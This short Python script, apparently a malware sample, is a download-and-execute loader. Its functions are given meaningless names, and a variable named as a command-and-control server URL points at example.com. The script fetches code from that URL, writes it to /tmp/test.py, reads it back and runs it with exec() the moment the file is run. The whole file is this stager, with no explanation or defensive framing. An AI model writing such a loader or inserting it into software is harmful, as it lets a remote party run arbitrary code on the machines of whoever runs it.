import requests
import os

def e1(url):
    resp = requests.get(url)
    return resp.text

def e2(fpath, code):
    with open(fpath, "w") as f:
        f.write(code)

def e3(fpath):
    with open(fpath, "r") as f:
        return f.read()

def e4(scr):
    exec(scr)

def e5(url, fpath):
    c = e1(url)
    e2(fpath, c)
    scr = e3(fpath)
    e4(scr)

def main():
    c2_srv_url = "http://example.com/test.py"
    tmp_f = "/tmp/test.py"
    e5(c2_srv_url, tmp_f)

main()
